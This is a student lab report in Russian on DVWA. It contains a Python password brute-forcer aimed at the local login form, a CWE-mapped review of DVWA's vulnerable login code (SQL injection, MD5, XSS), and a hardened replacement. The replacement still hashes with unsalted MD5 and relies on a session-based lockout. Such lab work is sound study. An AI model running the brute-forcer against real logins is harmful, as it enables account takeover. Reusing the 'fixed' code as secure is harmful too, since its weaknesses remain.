# SDLC_LAB_3_FarzievMT
**Предварительная подготовка**
Был скачан архив DVWA с официального ресурса на github.com, после чего он был установлен с использованием дистрибутивf для сборки локального веб-сервера XAMPP
![image](https://github.com/user-attachments/assets/dcc0da59-069f-46e1-827c-a9e87f4e568c)

Адрес: http://localhost/DVWA-master/login.php
![image](https://github.com/user-attachments/assets/e4547923-9971-4a80-a2f8-f612bd76712b)

После того как был совершен вход (логин-admin, пароль-password) был определен PHPSESSID, а также установлен "Security Level" = low
![image](https://github.com/user-attachments/assets/c130b6d2-c2d8-40e3-bdcd-3b44faa3fc02)

# Задания
### 1. Необходимо разработать переборщик паролей для формы в задании Bruteforce на сайте dvwa.local (Можно использовать [официальный ресурс](https://github.com/digininja/DVWA) или виртуальную машину Web Security Dojo)
Для уменьшения количества затраченного времени на подбор пароля было решено "помочь" программе и указать в коде, что пароль начинается на "passw". Данное решение было сделано исключительно в целях сокращения затраченного времени на подбор и для того, чтобы наглядно показать, что прогамма действительно выполняет свою функцию. 
```Java
import itertools
import requests
import time

# Настройки
url = "http://localhost/DVWA-master/vulnerabilities/brute/"
username = "admin"
charset = 'abcdefghijklmnopqrstuvwxyz'
password_length = 8
prefix = "passw"  # Префикс для пароля
session = requests.Session()

# Устанавливаем cookie для авторизации
session.cookies.set("PHPSESSID", "70v501t8fnf3um8jfbdo2bo9fs")
session.cookies.set("security", "low")

def generate_passwords_with_prefix(prefix, length, charset):
    """Генератор паролей фиксированной длины с указанным префиксом."""
    remaining_length = length - len(prefix)
    for combination in itertools.product(charset, repeat=remaining_length):
        yield prefix + ''.join(combination)

def try_password(url, username, password):
    """Проверка пароля."""
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    try:
        response = session.get(url, params=params)
        return "Welcome to the password protected area" in response.text
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Ошибка подключения: {e}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при запросе: {e}")
        return False

def main():
    start_time = time.time()
    print("[*] Начинаем подбор пароля...")
    
    # Генерация паролей и их проверка
    for password in generate_passwords_with_prefix(prefix, password_length, charset):
        print(f"[*] Пробуем пароль: {password}")
        if try_password(url, username, password):
            print(f"[+] Пароль найден: {password}")
            break
    else:
        print("[-] Пароль не найден.")

    end_time = time.time()
    print(f"[+] Время выполнения: {end_time - start_time:.2f} секунд")

if __name__ == "__main__":
    main()
```

Результат выполнения программы
![image](https://github.com/user-attachments/assets/b18e793e-3550-483d-bfbd-3c0c2c343154)

   
### 2. Проанализировать код и сделать кодревью, указав слабые места. Слабость уязвимого кода необходимо указать с использованием метрики CWE (база данных [cwe.mitre.org](http://cwe.mitre.org))
Код для ревью:

```Java
<?php
if( isset( $_GET[ 'Login' ] ) ) {
	// Get username
	$user = $_GET[ 'username' ];
	// Get password
	$pass = $_GET[ 'password' ];
	$pass = md5( $pass );
	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];
		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}
	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
1. Уязвимость SQL-инъекции (CWE-89)
Проблема: Входные данные $user и $pass напрямую подставляются в SQL-запрос без предварительной обработки. Это позволяет злоумышленнику выполнить произвольный SQL-код через внедрение специальных символов.
Рекомендация: Использовать подготовленные выражения (prepared statements) для предотвращения SQL-инъекций.
2. Использование небезопасного хэширования MD5 (CWE-327)
Проблема: MD5 является устаревшим и небезопасным алгоритмом хэширования. Он подвержен коллизиям и атакам подбора, особенно при отсутствии соли.
Рекомендация: Использовать современные алгоритмы хэширования, такие как password_hash() и password_verify(). Эти функции встроены в PHP и обеспечивают надежное хэширование паролей.
3. Вывод необработанных ошибок базы данных (CWE-209)
Проблема: При ошибках выполнения SQL-запроса выводится подробная информация об ошибке, включая детали базы данных. Это может раскрыть структуру базы данных злоумышленнику.
Рекомендация: Исключить отображение ошибок пользователям, а логи ошибок записывать в безопасное место (например, файл журнала).
4. Отсутствие проверки входных данных (CWE-20)
Проблема: Данные из $_GET (username и password) не проверяются и не фильтруются. Это открывает возможность для XSS-атак или других уязвимостей.
Рекомендация: Проверять и фильтровать все входные данные.
5. XSS-уязвимость в выводе аватара и имени пользователя (CWE-79)
Проблема: Выводимые данные $avatar и $user не экранируются, что позволяет злоумышленнику внедрить вредоносный JavaScript.
Рекомендация: Использовать функции экранирования, такие как htmlspecialchars().

### 3. Разработать свою систему авторизации на любом языке, исключающий взможность подбора паролей разработанным переборщиком паролей в задании 1. Возможно исправление авторизации из dvwa.local
Код PHP, написанный с учетом найденных слабых мест в предыдущем задании, и также исключающий возможность подбора паролей разработнным переборщиком
```Java
<?php

session_start();

if (!isset($_SESSION['failed_attempts'])) {
    $_SESSION['failed_attempts'] = 0;
}

if (!isset($_SESSION['last_attempt_time'])) {
    $_SESSION['last_attempt_time'] = 0;
}

// Ограничение на количество попыток
$max_attempts = 5;
$block_duration = 300; // 5 минут

if ($_SESSION['failed_attempts'] >= $max_attempts && (time() - $_SESSION['last_attempt_time']) < $block_duration) {
    $remaining_time = $block_duration - (time() - $_SESSION['last_attempt_time']);
    die("Too many failed login attempts. Please try again after " . ceil($remaining_time / 60) . " minutes.");
}

// Проверка наличия необходимых параметров
$message = "";
if (isset($_GET['Login'])) {
    if (isset($_GET['username']) && isset($_GET['password']) && isset($_GET['user_token'])) {
        // Генерация токена для предотвращения CSRF-атак
        if (!isset($_SESSION['user_token']) || empty($_SESSION['user_token'])) {
            $_SESSION['user_token'] = bin2hex(random_bytes(32));
        }

        $user = filter_input(INPUT_GET, 'username', FILTER_SANITIZE_STRING);
        $pass = filter_input(INPUT_GET, 'password', FILTER_SANITIZE_STRING);
        $user_token = filter_input(INPUT_GET, 'user_token', FILTER_SANITIZE_STRING);

        if ($user_token !== $_SESSION['user_token']) {
            $message = "Invalid token. Please refresh the page and try again.";
        } else {

            $mysqli = new mysqli("localhost", "root", "", "dvwa");

            if ($mysqli->connect_error) {
                die("Database connection failed: " . $mysqli->connect_error);
            }

            // Использование подготовленных выражений для защиты от SQL-инъекций
            $stmt = $mysqli->prepare("SELECT * FROM `users` WHERE user = ? AND password = ?");
            $hashed_password = md5($pass);
            $stmt->bind_param("ss", $user, $hashed_password);
            $stmt->execute();
            $result = $stmt->get_result();

            if ($result && $result->num_rows === 1) {
                $row = $result->fetch_assoc();
                $avatar = htmlspecialchars($row["avatar"], ENT_QUOTES, 'UTF-8');
                echo "<p>Welcome to the password protected area " . htmlspecialchars($user, ENT_QUOTES, 'UTF-8') . "</p>";
                echo "<img src=\"" . $avatar . "\" />";

                $_SESSION['failed_attempts'] = 0;
                exit;
            } else {
                $_SESSION['failed_attempts']++;
                $_SESSION['last_attempt_time'] = time();
                $message = "Username and/or password incorrect.";
            }

            $stmt->close();
            $mysqli->close();
        }
    } else {
        $message = "Please fill in all fields.";
    }
}

// Генерация нового токена при каждом обновлении страницы
if (!isset($_SESSION['user_token']) || empty($_SESSION['user_token'])) {
    $_SESSION['user_token'] = bin2hex(random_bytes(32));
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
</head>
<body>
    <form method="get">
        <input type="hidden" name="user_token" value="<?php echo $_SESSION['user_token']; ?>">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>
        <br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <br>
        <button type="submit" name="Login">Login</button>
    </form>

    <?php if (!empty($message)): ?>
        <p style="color: red;"><?php echo htmlspecialchars($message, ENT_QUOTES, 'UTF-8'); ?></p>
    <?php endif; ?>
</body>
</html>
```
![image](https://github.com/user-attachments/assets/2de36bf1-c5c5-4bf9-9415-7b3569a14018)

![image](https://github.com/user-attachments/assets/7765414c-8ff6-4720-87f7-baf89005e045)

![image](https://github.com/user-attachments/assets/dd7dcd15-cf37-4917-9036-9880c5112441)

Почему переборщик больше не работает:
- CSRF-токен: переборщик не может предсказать значение user_token, так как оно генерируется случайно для каждой сессии.
- Ограничение на количество попыток: после 5 неудачных попыток переборщик будет заблокирован на 5 минут.
- Улучшенная обработка ошибок: система не раскрывает информацию о причине отказа.

Как работает страница:
- Пользователь вводит имя и пароль, которые отправляются через метод GET.
- Если данные верны, отображается приветственное сообщение и аватар пользователя.
- Если данные неверны, пользователь видит сообщение об ошибке и остаётся на странице, чтобы повторить попытку.
- Счётчик неудачных попыток увеличивается. Если лимит превышен, отображается сообщение о блокировке.
